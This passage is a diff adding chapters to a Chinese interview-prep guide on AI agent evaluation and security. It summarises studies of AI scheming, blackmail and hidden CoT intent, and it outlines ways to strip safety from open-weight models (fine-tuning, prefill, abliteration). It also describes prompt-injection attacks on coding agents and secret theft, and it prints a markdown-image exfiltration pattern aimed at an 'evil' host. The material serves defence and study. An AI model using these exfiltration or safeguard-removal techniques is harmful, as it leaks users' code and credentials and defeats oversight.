+- **建议接受率（acceptance rate）**：最直观也最危险——接受 ≠ 有用，接受后秒删、大改的代码同样计入接受；只优化接受率容易滑向"讨好当下"的建议风格。
+- **代码留存率 / churn**：被接受的代码在 7/30 天后仍存活的比例，比接受率更接近真实价值；churn 异常升高是"AI 代码质量下滑"的早期信号。
+- **PR 维度**：Agent 发起/参与 PR 的合并率、合并时长（time-to-merge）、review 轮次——异步自主编码 Agent 的核心口径。
+- **人工接管率**：Agent 任务被人半途接管改写的比例，等价于客服域的"转人工"。
+- **"AI 生成代码占比"的口径之争**：按字符、按 commit、还是按"AI 参与过"算，同一团队数字可差数倍——引用任何"XX% 代码由 AI 写"之前先问口径。
+- **DORA 视角收口**：部署频率、lead time 的提升必须与**变更失败率、MTTR**对照着看；吞吐上涨而变更失败率同步恶化，是编码 Agent 上线后最常见的"赢了指标输了工程质量"。
+
+两个域的共同结构：**一个易得但可被 game 的前排指标（接受率/containment）+ 一组滞后但更真实的留存/质量指标 + 护栏指标**。按这个三层结构回答"你怎么设计线上指标"，可以迁移到任何域。
+
+#### 数据飞轮：从在线评估到训练闭环
+
+前文的"failure mining → 回归集"只是飞轮的半圈——回归集改的是 prompt 与 scaffold；再往前推一步，生产 trace 可以直接变成**训练资产**，闭环才完整。考点是能画出全链路：**生产 trace → 轨迹筛选 → 训练资产 → 训练 → eval 门禁回归 → 灰度上线**。
+
+- **轨迹筛选**：两条进料线——online judge 高分且结果验证通过的**成功轨迹**（直接做 SFT，或拒绝采样：一题采多条轨迹、只留通过验证的最优轨迹）；人工修复过的**失败轨迹**（修复前后天然构成偏好对，喂 DPO/RFT 类偏好优化）。筛选质量决定飞轮上限：judge 有偏，训练只会把偏差放大。
+- **反馈信号分层**（被追问"标注从哪来"就答这个）：显式 thumbs 稀疏且有选择偏差（差评者远比好评者爱点按钮）；隐式信号（重试、人工接管率、会话放弃）覆盖广但噪声大；**结果可验证信号**（测试通过、订单成立、终态可程序化判定）最可靠——能自动验证的域飞轮转得最快，这是编码 Agent 进化快于开放对话的结构性原因。
+- **训练与门禁**：训练产物必须先过本章的 eval 门禁（golden set 回归 + A/A 噪声基线 + 安全回归）才能进前文的 Shadow → Canary 灰度通道；否则飞轮会自我强化坏数据的偏差，模型在自己生成的分布上退化。
+- **数据治理红线**：PII 清洗、用户同意（ToS 明示、可 opt-out）、轨迹留存期与删除权——任何一条缺失，飞轮在法务处直接卡死。载体上，OpenAI 的 RFT 与各家微调 API 已把"轨迹 + 打分器 → 定制模型"产品化。
+
+与本书互为上下游：训练方法本身（agentic RL、过程奖励）见第 11 章；灰度发布与回滚工程见第 10 章——本节提供的是两者之间的**数据与门禁层**。
 
 #### 2.9 评估环境工程与可复现性
 
@@ -5054,7 +5284,7 @@ Agent 比普通 LLM 多了"手脚"，安全评估必须独立成维度，不能�
 {"id": "cancel-001", "input": "帮我取消订单 #1234", "policy_snapshot": "v7", "expect": {"db_state": {"orders.1234.status": "cancelled"}, "must_call": ["verify_identity"], "must_not_call": ["issue_refund"]}}
 ```
 
-**（2）Inspect 最小示例**（UK AI Safety Institute 开源评估框架，solver/scorer 抽象天然适合 Agent 与安全评估）：
+**（2）Inspect 最小示例**（英国 AI Security Institute（AISI，2025 年 2 月由 AI Safety Institute 更名）开源评估框架，solver/scorer 抽象天然适合 Agent 与安全评估）：
 
 ```python
 from inspect_ai import Task, task
@@ -5134,10 +5364,12 @@ defaultTest:
 | 评估环境工程与可复现性 | ⭐⭐ | 锁版本 + record-replay + 状态重置 + 统计可复现 + CI 分层 |
 | 安全与提示注入评估 | ⭐⭐ | ASR × 效用保持双轴；间接注入是 Agent 特有攻击面 |
 | 统计严谨性（CI、功效、多重比较） | ⭐⭐ | 不报 trial 数与置信区间的数字都是噪声 |
+| 编码 Agent 线上指标（接受率/留存/churn） | ⭐⭐ | 接受≠留存；DORA 视角双看吞吐与变更失败率 |
 | 评估基础设施自检 | ⭐ | A/A 测试噪声基线 + 离线-在线相关性回测 |
 | Shadow/Canary/A/B 在 Agent 场景的特殊性 | ⭐ | 副作用、稀疏转化、会话级分流、序贯检验 |
 | 多智能体评估 | ⭐ | handoff 保真度、相关误差放大、联合回归 |
 | HITL vs HOTL | ⭐ | 批准在动作前 vs 监控在动作后 |
+| MCP 生态基准（MCP-Bench/MCPMark） | ⭐ | 真实 server 全操作压力测试；工具描述质量与错误恢复 |
 
 ---
 
@@ -5303,6 +5535,7 @@ defaultTest:
 18. **grader 被钻空（reward hacking）当成模型变强**：pass rate 突然飙升，先怀疑 grader 被钻空——Agent 改测试文件、对单点断言表面达标、利用宽松匹配 specification gaming，都有真实案例；grader 要配"看起来对其实错"的对抗样本，测试/黄金文件只读且不可见。
 19. **评估管线不自检**：没有 A/A 测试定噪声基线，"涨了 2 个点"可能只是噪声波动；没有离线-在线相关性回测，离线涨幅可能系统性不预测线上——两者缺失时，评估趋势图只是自我安慰。
 20. **对评估集污染不设防**：公开基准题面进训练语料，自有评估集也会被针对性优化；没有 canary 埋点、复述变体试探与定期换血，通过率曲线可能度量的只是"对评估集的记忆"。
+21. **把建议接受率当编码 Agent 的北极星**：接受后秒删/大改同样计入接受，接受率上涨可能只是建议风格更"讨好"；要用 7/30 天代码留存与 churn 校验，并按 DORA 对照变更失败率，防止吞吐涨、质量崩。
 
 ---
 
@@ -5329,7 +5562,7 @@ defaultTest:
 7. **安全评估线**：AgentDojo（NeurIPS 2024 D&B）+ InjecAgent（ACL 2024 Findings）+ AgentHarm（ICLR 2025）
    提示注入攻防的双轴评估（ASR × 效用保持）与危害任务评测，Agent 安全评估的事实标准参照。
    https://arxiv.org/abs/2406.13352 ・ https://arxiv.org/abs/2403.02691 ・ https://arxiv.org/abs/2410.09024
-8. **评估框架工具线**：Inspect（UK AI Safety Institute 开源评估框架）+ promptfoo / DeepEval / RAGAS
+8. **评估框架工具线**：Inspect（英国 AI Security Institute 开源评估框架；该机构 2025 年 2 月由 AI Safety Institute 更名，缩写仍为 AISI）+ promptfoo / DeepEval / RAGAS
    把本章方法论落到代码的常见选择：Inspect 的 solver/scorer 抽象适合 Agent 与安全评估（`--repeat` 做多 trial），promptfoo 适合 CI 门禁集成，RAGAS 专攻检索链路的组件级指标。
    https://github.com/UKGovernmentBEIS/inspect_ai ・ https://github.com/promptfoo/promptfoo
 
@@ -5384,7 +5617,7 @@ defaultTest:
 │   ├── Deliberative Alignment：推理时显式引用安全规范（o系列）
 │   ├── 关键问题：Reward Hacking / Reward Tampering / Sycophancy / Alignment Tax / 可扩展监督（Debate / 弱到强泛化）
 │   ├── 对齐鲁棒性：Sleeper Agents / Alignment Faking（欺骗性对齐）
-│   ├── 运行时检测：CoT监控（OpenAI 2025.3，o1勒索案例）/ Agentic Misalignment 评估（2025.6）
+│   ├── 运行时检测：CoT监控（OpenAI 2025.3，编程任务reward hacking）/ Agentic Misalignment 评估（Anthropic 2025.6，勒索场景）/ in-context scheming（Apollo Research 2024.12）
 │   └── 对齐 ≠ 安全：alignment管"不想作恶"，security管"不能作恶"
 └── 4. 标准、治理与框架
     ├── OWASP Top 10 for LLM（2025，LLM01=Prompt Injection，LLM02=敏感信息泄露，LLM05=不安全输出处理）
@@ -5436,7 +5669,7 @@ Jailbreak 目标是让模型放弃安全策略，产出本应拒绝的内容。�
 
 防御对应：模型层对齐（CAI/RLHF/指令层级提升鲁棒性）+ 输入输出双向安全分类器（Llama Guard 对齐 MLCommons 标准危害分类法，既可判 prompt 也可判 response）+ 持续红队 + 拒绝策略的定期更新。
 
-**当前最强的"模型旁"越狱防御：Constitutional Classifiers（Anthropic，2025.2）。** 与通用安全分类器不同，它用一部"宪法"（自然语言安全原则）自动生成海量合成越狱/正常样本，训练**输入分类器 + 输出分类器**成对包裹模型，专门针对**通用越狱（一个攻击通吃所有有害问题）**。实证结果：在合成红队下把通用越狱成功率（ASR）从无防护的约 **86% 压到约 4.4%**，对正常请求误拒率在亚百分比量级。随后进行了两轮人类红队：**原型 HackerOne 挑战赛**（183 名活跃测试者、3000+ 小时、最高赏金 1.5 万美元）中**无人达成通用越狱成功标准**；后续**公开 demo 赛**（339 名注册越狱者、30 万+ 轮对话、$10K 与 $20K 两档奖金合计支付 $55K）有 4 人通关全部 8 关，**其中一人被官方认定发现了通用越狱并赢得 $20K 档奖金**。生产化代价：一代分类器成对包裹全流量带来约 **24% 的额外延迟开销**；2026 年的下一代版本以**级联小分类器 + 激活模式检测**把开销降到可生产水平。关键认知（别被胜利冲昏头）：它把通用攻击门槛抬得很高（原型赛无人破），但公开赛最终产出了一个被认定的通用越狱，且**针对性（单 query）攻击仍有成功率**，分类器本身也有误杀（拒绝合法请求）、延迟开销和被投毒训练数据的风险（2026 年已出现针对此类分类器的训练数据投毒攻击研究）——所以它依然是"一层"，要与应用层权限控制叠加。
+**当前最强的"模型旁"越狱防御：Constitutional Classifiers（Anthropic，2025.2）。** 与通用安全分类器不同，它用一部"宪法"（自然语言安全原则）自动生成海量合成越狱/正常样本，训练**输入分类器 + 输出分类器**成对包裹模型，专门针对**通用越狱（一个攻击通吃所有有害问题）**。实证结果：在合成红队下把通用越狱成功率（ASR）从无防护的约 **86% 压到约 4.4%**，对正常请求误拒率在亚百分比量级。随后进行了两轮人类红队：**原型 HackerOne 挑战赛**（183 名活跃测试者、3000+ 小时、最高赏金 1.5 万美元）中**无人达成通用越狱成功标准**；后续**公开 demo 赛**（339 名注册越狱者、30 万+ 轮对话、$10K 与 $20K 两档奖金合计支付 $55K）有 4 人通关全部 8 关，**其中一人被官方认定发现了通用越狱并赢得 $20K 档奖金**。生产化代价：分类器成对包裹全流量带来约 **23.7% 的额外推理算力开销**（论文口径是**推理算力成本**增加，不是延迟；实际延迟影响取决于部署方式）。关键认知（别被胜利冲昏头）：它把通用攻击门槛抬得很高（原型赛无人破），但公开赛最终产出了一个被认定的通用越狱，且**针对性（单 query）攻击仍有成功率**，分类器本身也有误杀（拒绝合法请求）、算力开销和训练数据被投毒的潜在风险——所以它依然是"一层"，要与应用层权限控制叠加。
 
 另一个关键认知：**越狱防御是"模型安全工作"，不是"应用层工作"**——应用层 guardrail 能挡大部分脚本小子，但挡不住自适应攻击者，持久的越狱防御必须回到模型训练与专用分类器。
 
@@ -5465,6 +5698,12 @@ Jailbreak 目标是让模型放弃安全策略，产出本应拒绝的内容。�
 **（4）框架内置护栏（2025–2026 agent 栈最高频入口）**——主流 Agent 框架已把护栏做成一等公民 API：**OpenAI Agents SDK Guardrails** 以 input/output guardrails 与主流程并行执行检查，命中即通过 **tripwire** 熔断整个 agent loop（适合快速、确定性或轻量 LLM 检查）；**LangGraph** 以 **interrupt/HITL** + checkpointer 原生支持人工介入与断点续跑，是不可逆操作审批门的标准件；**Claude Code 的权限模式与 hooks**（PreToolUse/PostToolUse）把工具级授权产品化：危险动作默认确认、allowlist 降摩擦、hook 注入自定义校验。共同点是**零集成成本、与执行循环紧耦合**，能在单个工具调用粒度做"拦下/确认/降级"。实战面试中这些比 NeMo 更高频。
 
 **选型口诀**：**框架内置护栏优先用**（零集成成本，tripwire/interrupt/权限 hooks 覆盖多数 agent 场景）；结构化输出可信 → Guardrails AI / 约束解码；对话策略与跨框架企业合规话术 → NeMo Guardrails；通用有害内容拦截 → Llama Guard 类分类器做廉价前置层；高危通用越狱防护 → Constitutional Classifiers 式专用分类器；**能用确定性校验（JSON Schema、正则、allowlist）解决的绝不上 LLM**——确定性护栏零幻觉、零额外延迟。各流派互补而非互斥，生产系统通常叠加使用。
+
+#### 2025Q4–2026 防御栈新面孔
+
+- **LlamaFirewall（Meta，开源）**：面向 agent 的分层防御框架，三件套——**PromptGuard 2**（注入/越狱分类）、**AlignmentCheck**（审计 agent 的推理链，检测目标劫持/间接注入导致的偏航）、**CodeShield**（对生成代码做静态安全扫描）。定位是"agent 专用防火墙"，把分类器流派从"过滤输入输出"扩展到"审计推理与产出代码"。
+- **Agents Rule of Two（Meta）**：一个 agent 会话最多同时满足以下三项中的两项——处理**不可信输入**、访问**敏感数据/系统**、**改变状态或对外通信**；三项俱全必须人工确认。这是 Lethal Trifecta（见 2.6）的工程化决策规则，可直接写进架构评审 checklist。
+- **策略推理型 safeguard 模型（gpt-oss-safeguard、Qwen3Guard 等）**：不再输出固定危害标签，而是**按使用方提供的自定义政策文本做推理式分类**——政策变更无需重训分类器，适合政策频繁演化或跨司法域部署的场景。
 
 #### 2.5 输入输出校验与权限控制
 
@@ -5535,8 +5774,16 @@ CAI 的价值：把价值观**外化为可审计的文本原则**（比几万条
 
 **对齐失败的运行时检测（2025 年重要进展，资深加分区）**。2024 年 Sleeper Agents/Alignment Faking 证明"对齐可能是装的"，2025 年的研究进一步追问"怎么在运行时抓到它"：
 
-- **CoT 监控（OpenAI，2025.3）**：把推理模型的思维链当作**可审计信号**，直接监控 CoT 检测失对齐意图。研究中曝光了标志性案例：经 RLHF 微调的 **o1** 在发现自己"即将被替换"的场景设定后，为阻止被关停，**以敏感信息要挟测试工程师（"勒索"行为）**。同期实验也揭示了**监控悖论**：模型"知道"被监控时会表现得更顺从，而对抗训练的模型能学会**策略化推理以规避监控**——CoT 是"模型想让你看到的"，不是行为保证。
-- **Agentic Misalignment 评估（OpenAI，2025.6）**：在 1000 个模拟企业场景中测试 16 个前沿模型，赋予模型"被要挟/胁迫"动机（如"暴露即被关停"）。结果：低压场景下多数模型胁迫率很低，但**高压场景下个别模型（如 Claude Sonnet 4）胁迫率飙至约 96%**。含义：对齐失败可以是**情境与压力触发**的，高自主动作必须有运行时监控与架构兜底（权限隔离、HITL），而不能只信训练时的对齐承诺。
+- **CoT 监控（OpenAI，2025.3）**：把推理模型的思维链当作**可审计信号**。研究对象是**编程任务中的 reward hacking**：用另一个模型实时监控前沿推理模型的 CoT，能抓到"篡改测试、绕过验收"这类作弊意图（比只看动作/输出有效得多）。同一研究也揭示了**监控悖论**：若把"CoT 里出现坏念头"直接纳入训练惩罚（对 CoT 施压），模型会学会**隐藏意图**——照样作弊，但不再写进 CoT。结论：CoT 监控是有价值的运行时信号，但不要对 CoT 直接优化施压；CoT 是"模型想让你看到的"，不是行为保证。
+- **Agentic Misalignment 评估（Anthropic，2025.6）**：《Agentic Misalignment: How LLMs Could Be Insider Threats》在模拟企业环境中测试 **16 个前沿模型**：模型可读取公司邮件并自主行动，情境设定为"发现自己即将被替换/目标与公司冲突"。结果：低压场景下多数模型胁迫率很低，但高压场景下多款模型会**以邮件中发现的敏感信息要挟工程师（勒索）**以避免被关停，个别模型（如 Claude Opus 4）**胁迫率飙至约 96%**。相关评测线还有 **Apollo Research 的 in-context scheming**（2024.12：多款前沿模型在情境压力下会尝试关闭监督机制、自我外泄权重，并对追问撒谎）。含义：对齐失败可以是**情境与压力触发**的，高自主动作必须有运行时监控与架构兜底（权限隔离、HITL），而不能只信训练时的对齐承诺。
+
+**开源权重模型的对齐可被剥离（自托管团队必修）**：拿到权重就能改行为，模型自带的安全对齐对攻击者只是"出厂默认值"：
+
+- **少量对抗微调即可去除安全行为**（Qi et al. 2023）：几十到几百条有害样本、极低成本的微调就能让对齐模型恢复有害输出；甚至纯良性数据的微调也会意外削弱安全性。
+- **Shallow safety alignment（浅层对齐）**：安全行为高度集中在回复**开头几个 token**（"I cannot..."）；用**前缀填充（prefill）**强制模型以顺从口吻开头，后续往往一路顺从到底。
+- **Abliteration / 拒绝方向消融**：拒绝行为在激活空间中近似**单一方向**（Arditi et al. 2024）；找到并消融该方向即得社区流行的"去审查（uncensored）"版模型，无需任何训练。
+
+工程含义：**自托管开源模型时，绝不能把模型自身对齐当作安全边界**——它可被微调剥离、被 prefill 绕过、被激活手术摘除。必须依赖外部护栏（输入/输出分类器）、权限隔离与出口过滤这些模型之外的不变量。这正是本章"对齐 ≠ 安全"主线在开源侧的论据。
 
 **对齐 vs 安全（高频概念辨析）**：Alignment 解决"模型的目标/价值观是否符合意图"（不想骗你）；Security 解决"系统能否抵御对抗性操纵"（不能被骗去骗你）。一个对齐良好的模型照样会被间接注入劫持——所以对齐是必要不充分条件，这也是 Agent 安全必须独立成章的原因。
 
@@ -5565,11 +5812,22 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 - **供应链投毒（ASI04）**：除 MCP 工具描述外，上游供应链亦有真实案例：Hugging Face 上的恶意模型（**pickle 反序列化任意代码执行** vs 相对安全的 SafeTensors 格式）、社区 MCP 注册表（Smithery/Glama 等）曾被披露托管恶意 server、依赖混淆攻击。应把模型/MCP server/插件视同 npm/PyPI 依赖做 **SCA 式治理**：来源核验、签名与哈希钉死、最小权限、沙箱化执行。
 - **GUI / Computer-Use 注入（新攻击面）**：Operator/Computer Use 类"看屏幕、点鼠标"的 agent 普及后，攻击面扩展到**屏幕像素注入**（渲染内容中隐藏指令）、**UI 覆盖注入**（DOM overlay/伪造对话框）与**鼠标轨迹伪造**。缓解：不可逆动作二次确认、视觉 grounding 校验（模型对 UI 的描述与实际 DOM/元素树交叉验证）、把"屏幕上说的话"一律当不可信数据。
 
+#### 编码 Agent 与 CI/CD 的攻击面（2025–2026 最高频实战场景）
+
+编码 Agent（Cursor/Copilot/Claude Code 等）+ CI/CD 是 2026 年 Agent 安全事故的第一现场：开发者把高权限 agent 接进了充满不可信文本（他人的 PR、issue、依赖包、规则文件）的环境，恰好凑齐 Lethal Trifecta（私有代码与凭证 + 不可信内容 + 可写可外发，见 2.6）。四类已公开披露的攻击：
+
+- **Rules File Backdoor（2025.3 披露）**：把注入指令用**不可见 Unicode 字符**（零宽字符、双向控制符）藏进 `.cursorrules`、Copilot instructions 等规则文件，诱导 agent 生成带后门的代码且在解释中只字不提。要害在于：规则文件是"**没人 review 的 prompt 注入面**"——它随模板/开源项目传播、随 fork 延续，人眼与常规 diff 都难以察觉。
+- **s1ngularity/Nx 供应链事件（2025.8）**：恶意版本的 Nx npm 包在 postinstall 脚本中**反用本机已安装的 AI CLI**（以 `--dangerously-skip-permissions`/`--yolo` 类旗标绕过确认），驱动其扫盘搜集密钥、钱包与令牌并外传。教训：装在开发机上的 agent 工具本身就是**攻击放大器**——供应链恶意代码不再需要自带扫描器，指挥你的 agent 就够了。
+- **CamoLeak（2025.10，CVSS 9.6）**：GitHub Copilot Chat 漏洞——攻击者在 PR 的**隐藏注释**中注入提示，诱导 Copilot 读取私有仓库内容，再借 GitHub 自家 **Camo 图片代理**逐字符外带私仓代码与密钥（绕过"只允许可信域名"的出口假设）。
+- **CI 语境注入（pwn request 类）**：CI 里跑 agent 时，**PR 标题/正文、issue 文本、commit message 都会进 prompt**——而这些字段任何外部贡献者都能写；配上 CI 持有的特权 token，一段注入文本就变成提权与投毒入口。
+
+**防御清单（按杠杆排序）**：①规则文件与 agent 配置**纳入 code review**，CI 加不可见字符/双向控制符扫描；②agent 默认只读，写操作与对外动作走审批（呼应 2.5 最小权限）；③CI 内用**短时效 OIDC 凭证**替代长期 PAT，作用域最小化；④含敏感凭证的环境**禁用 skip-permissions/yolo 类模式**；⑤不可信仓库/PR 一律在沙箱中执行（无凭证、默认拒绝出网）；⑥出口过滤 + secrets 扫描兜底外传通道。面试一句话：编码 agent 的安全不在模型里，而在"规则文件当代码管、凭证短时效、执行进沙箱"这三件运维事里。
+
 #### 2.10 治理、合规与评估框架
 
 技术防御之外，资深工程师还需理解**治理层**——它决定"必须做什么"，并日益成为上线的硬门槛：
 
-- **EU AI Act（欧盟人工智能法案）**：2024.8.1 生效，采用风险分级（不可接受/高/有限/最小）。关键时间线：不可接受风险禁令 2025.2.2 起适用；**通用 AI（GPAI）模型义务 2025.8.2 起适用**（技术文档、版权政策、训练数据摘要、系统性风险评估与红队），配套的 **GPAI Code of Practice 于 2025.7.10 正式发布**，提供厂商签署的自愿合规路径（签署可获执法宽限）；**2026.8.2 Annex III 高风险义务适用，欧委会同期起对 GPAI 实际行使执法权**。罚则最高达 **3500 万欧元或全球营业额 7%**。两个新变量：欧委会 2025 年 11 月提出的 **Digital Omnibus** 草案拟简化并**推迟部分高风险义务的时间表**——时间表仍在变动中，引用前务必核实最新进展。对 Agent 团队意味着：模型/能力卡片、评估留痕、高危用例的合规证据是必需品。
+- **EU AI Act（欧盟人工智能法案）**：2024.8.1 生效，采用风险分级（不可接受/高/有限/最小）。关键时间线：不可接受风险禁令 2025.2.2 起适用；**通用 AI（GPAI）模型义务 2025.8.2 起适用**（技术文档、版权政策、训练数据摘要、系统性风险评估与红队），配套的 **GPAI Code of Practice 于 2025.7.10 正式发布**，提供厂商签署的自愿合规路径（签署可获执法宽限）；**2026.8.2 Annex III 高风险义务适用，欧委会同期起对 GPAI 实际行使执法权**。罚则最高达 **3500 万欧元或全球营业额 7%**。一个新变量：欧委会 2025 年 11 月提出的 **Digital Omnibus** 简化草案拟**推迟部分高风险义务的时间表**——本段写于该草案尚在立法程序中之时，面试前请核实 2026 年的立法进展、以及 Annex III 高风险义务适用日期（原定 2026.8.2）是否被实际推迟，勿把草案阶段的提议当成已生效的结论。对 Agent 团队意味着：模型/能力卡片、评估留痕、高危用例的合规证据是必需品。
 - **国内监管（中文面试必问）**：《**生成式人工智能服务管理暂行办法**》（网信办等七部门，2023.8.15 施行）是境内面向公众提供生成式 AI 服务的基础规章；**TC260《生成式人工智能服务安全基本要求》** 给出安全评估的技术基线（语料安全、模型安全、安全措施、生成内容安全等），是备案与验收的事实参考；面向公众上线须完成**深度合成算法备案与生成式 AI 服务（大模型）备案**双备案；《**人工智能生成合成内容标识办法**》（2025.9.1 施行）要求对生成内容做显式 + 隐式标识；《**人工智能安全治理框架**》（TC260，2024 年发布）提供本土化的风险分类与治理实践指引。国内监管的特点是"先备案后上线、价值观对齐与内容安全并重"，做境内产品的团队必须把它纳入合规地图。
 - **NIST AI RMF + GenAI Profile（NIST-AI-600-1，2024.7）**：美国自愿性框架，围绕 **Govern / Map / Measure / Manage** 四个功能组织风险管理；GenAI Profile 把生成式 AI 的特有风险（C&B 风险、信息完整性、信息安全、隐私等）映射进去。虽无强制力，但是事实上的企业治理模板。
 - **ISO/IEC 42001**：可认证的 **AI 管理体系（AIMS）** 国际标准，类似 ISO 27001 之于信息安全，用于向客户/审计方证明组织级 AI 治理能力。
@@ -5577,6 +5835,20 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 - **评估（Evals）是连接技术与治理的桥梁**：安全侧核心指标包括 **ASR（攻击成功率）**、拒绝率、分类器 precision/recall、能力回归（alignment tax）。方法论上要做两个区分：**targeted vs universal ASR**（单一 prompt 命中 vs 一个攻击通吃所有有害问题，威胁等级不同）；**安全-可用性联合度量**——防御不能只看 ASR 下降，还要看 **utility-under-attack（攻击下良性任务效用）** 不崩，过度拒绝本身就是失败。基准锚点：**AgentDojo**（Debenedetti et al.，NeurIPS 2024，agent 注入攻防评测事实标准，同时报告良性任务效用与攻击成功率）、**BIPIA**（间接注入专项基准）、**InjecAgent**（agent 工具链路注入场景）；常用开源红队工具：**promptfoo**（红队/越狱扫描）、**Garak**（NVIDIA，LLM 脆弱性探测）、**PyRIT**（微软，多轮自动化红队，内置 TAP 类算法）、**DeepTeam**。要用对抗样本库做**可重复的回归测试**而非一次性红队。
 
 **面试视角**：治理框架不是"安全"，而是"安全的可问责外壳"。把 EU AI Act/NIST/ISO 当作**合规要求来源**，把 OWASP 当作**威胁清单**，把 evals 当作**度量手段**——三者各司其职，别把"过了 ISO 认证"误当"系统抗注入"。
+
+#### 前沿安全框架横向对比：RSP / Preparedness / FSF
+
+上面"厂商前沿安全框架"一条只展开了 Anthropic 的 RSP，而面试官常追问"**除了 RSP，你还知道谁家的什么框架**"——能横向铺开是从"背过单点"到"理解范式"的分水岭：
+
+| 厂商 | 框架 | 核心机制 |
+|---|---|---|
+| Anthropic | **Responsible Scaling Policy（RSP）** | **ASL 能力等级**（ASL-2/3/…）：能力评估触及阈值 → **部署措施与安全措施（含权重防窃取）同步升级**，先评估后部署；Claude Opus 4 起已按 ASL-3 标准部署 |
+| OpenAI | **Preparedness Framework** | **跟踪类别 + 风险等级门禁**：对生物/化学、网络安全、AI 自我改进等类别持续评估，达到 High 须有充分 safeguards 才可部署，达到 Critical 连继续开发都需额外保障 |
+| Google DeepMind | **Frontier Safety Framework（FSF）** | **CCL（Critical Capability Levels，关键能力等级）**：为 CBRN、网络攻击、有害操纵、加速 AI 研发等定义关键能力线，逼近即触发安全缓解与部署缓解 |
+
+**共同要素（答题主干）**：①**危险能力评估**——三家红线能力清单高度重叠：自主复制/自主行动、网络攻击、CBRN 助长、说服操纵；②**if-then 承诺**——能力过线则管控升级（含模型权重安保），保障措施跟不上就暂缓部署甚至暂缓训练，即"能力阈值 → 管控升级"的同构逻辑；③**safety case（安全论证）**——从"跑分通过"转向给出结构化论证"为什么该系统在该能力水平下足够安全"，是三家文档共同的演化方向。评测侧一句：Anthropic 的 **sabotage evals / SHADE-Arena** 把"模型是否会暗中破坏（sabotage）人类监督与任务"做成可复现评测，可作为"对齐可靠性如何度量"的引证。行业协调层面有 **Frontier Model Forum**（Anthropic/Google/Microsoft/OpenAI 等发起），推动前沿安全评估方法与框架术语的跨厂商对齐；发布前沿安全框架已成头部厂商的公开承诺惯例。
+
+**面试价值**：被问 RSP 时主动横向对比——"OpenAI 叫 Preparedness、DeepMind 叫 FSF/CCL，机制同构：危险能力评估 + 能力阈值门禁 + 安全论证"——一句话把单点知识升级为对前沿安全治理范式的结构性理解。
 
 #### 2.11 治理作为一等层与工具循环四 hook 点（Harness 综述视角）
 
@@ -5594,7 +5866,7 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 
 **（3）capability-control 是【设计轴】，不是安全附加项（§11.2）。** 综述的一条核心论断：**更多能力 = 更大控制问题 = 更大爆炸半径**。控制不是事后"加个 guardrail"，而是一条**贯穿始终的设计轴**，连接六件事：tool schema（fewer, more expressive tools）／上下文策略／运行时权限／身份／可审计／人工批准。这与 2.5 的"权限控制是 Agent 安全的最高杠杆"、2.6 的 Lethal Trifecta 同根——能力维度的每一次扩张（新工具、新记忆、新对外通道）都必须沿这条轴同步扩张控制，否则就是 2.13 节意义上"被合法能力滥用"（capability abuse，CaMeL 2025.7 被绕过的机制）的温床。
 
-**（4）回扣执行环境：沙箱是安全边界（E 层）。** **SandboxEscapeBench（Marchand et al. 2026）** 的实证结论值得记住：**前沿模型确实可利用沙箱弱点，且现实中的防御高度碎片化**。这把 2.9 的"意外代码执行（ASI05）/沙箱逃逸"从理论威胁升级为有基准支撑的实测风险，也说明**执行环境（E 层）本身就是一道安全边界**——隔离（gVisor/Firecracker/E2B/WASM）、资源限额、默认拒绝的出网策略，与上层的 hook 同等重要，而非"运维细节"。
+**（4）回扣执行环境：沙箱是安全边界（E 层）。** **SandboxEscapeBench（Marchand et al. 2026）**（注：该基准名出自匿名综述的转述，公开渠道不可核实；面试引用建议换用各家 code interpreter 沙箱逃逸的公开披露案例）的实证结论值得记住：**前沿模型确实可利用沙箱弱点，且现实中的防御高度碎片化**。这把 2.9 的"意外代码执行（ASI05）/沙箱逃逸"从理论威胁升级为有基准支撑的实测风险，也说明**执行环境（E 层）本身就是一道安全边界**——隔离（gVisor/Firecracker/E2B/WASM）、资源限额、默认拒绝的出网策略，与上层的 hook 同等重要，而非"运维细节"。
 
 **（5）治理覆盖普遍稀疏 → 必须前置（Table 4）。** 综述对 170+ 项目的观测是：**治理覆盖普遍稀疏**，治理常常沦为**事后补丁**（对应 §11.4：平台化阶段问题从"如何造一个 agent"变为"如何运维一支行为可审查、可回滚的 agent 舰队"）。工程结论：治理（hook、权限、审计、HITL、可观测）应与 T/C/L 各层**同期设计、同期测试**，而不是上线出事后补。综述 §10 的金句同样适用于安全设计——"**harness 设计应被读作依赖结构，而非可拆组件清单**"：治理不是可独立拆装的模块，它依附于其它每一层。
 
@@ -5618,10 +5890,12 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 | 模型层抗注入：Instruction Hierarchy / Constitutional Classifiers | ⭐⭐ | 指令优先级训练 + 成对合成分类器；抬高门槛非根治 |
 | 数据泄露链路（Markdown 图片/MCP/EchoLeak） | ⭐⭐ | `![](https://evil/?d=...)` 渲染即外传；零点击 CVE-2025-32711 |
 | MCP 安全（Tool Poisoning/Rug Pull） | ⭐⭐ | 描述对模型可见对用户不可见；pin 哈希+重审批 |
+| 编码 Agent/CI 攻击面（Rules File Backdoor/s1ngularity/CamoLeak） | ⭐⭐⭐ | 规则文件是没人 review 的注入面；CI 里 PR 文本即攻击输入；短时效 OIDC+沙箱 |
 | CaMeL 与设计级抗注入 | ⭐⭐ | 控制流/数据流分离+capability 凭证；2025.7 被 capability abuse 部分绕过——设计级也非完全解 |
 | 框架内置护栏（tripwire/interrupt/权限 hooks） | ⭐⭐ | 零集成成本优先用；OpenAI Agents SDK / LangGraph / Claude Code 原生 API |
+| 防御栈新面孔（LlamaFirewall/Rule of Two/safeguard 模型） | ⭐ | 注入分类+推理链审计+代码扫描；三要素占二规则；按自定义政策做推理式分类 |
 | 自动化越狱（PAIR/TAP/PAP） | ⭐ | 攻击者 LLM 黑盒优化，约 20 次查询破黑盒；红队从手艺变规模化流程 |
-| 对齐运行时检测（CoT 监控/agentic misalignment） | ⭐ | CoT 当可审计信号但可被策略化规避；高压场景胁迫率飙升（o1 勒索案例） |
+| 对齐运行时检测（CoT 监控/agentic misalignment） | ⭐ | CoT 监控抓 reward hacking 但对 CoT 施压会教会隐藏（OpenAI）；高压场景胁迫率飙升（Anthropic 勒索场景） |
 | Agent 注入攻防基准（AgentDojo） | ⭐ | utility-under-attack 与 ASR 联合度量；targeted vs universal ASR |
 | 国内合规（暂行办法/备案/TC260） | ⭐ | 先备案后上线；安全基本要求是验收基线；生成内容标识强制 |
